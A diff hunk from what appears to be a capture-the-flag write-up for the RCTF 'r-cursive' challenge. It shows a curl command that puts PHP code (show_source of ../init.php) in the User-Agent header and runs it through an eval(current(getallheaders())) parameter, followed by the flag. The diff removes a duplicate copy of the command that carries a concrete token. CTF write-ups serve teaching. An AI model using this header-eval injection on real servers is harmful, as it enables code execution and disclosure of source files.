@@ -2345,8 +2345,6 @@ Now `open_basedir` is `/var/www/sandbox:/tmp`. So, finally:
 
     $ curl -H "Host: .a" -A "show_source('../init.php');" "http://r-cursive.ml:1337/<token>/?cmd=eval(current(getallheaders()));"
 
-curl -H "Host: .a" -A "show_source('../init.php');" "http://r-cursive.ml:1337/10e26884e4422841c514db060318ecc879ed9a24/?cmd=eval(current(getallheaders()));"
-
 It works!
 
 `RCTF{apache_mod_vhost_alias_should_be_configured_correctly}`
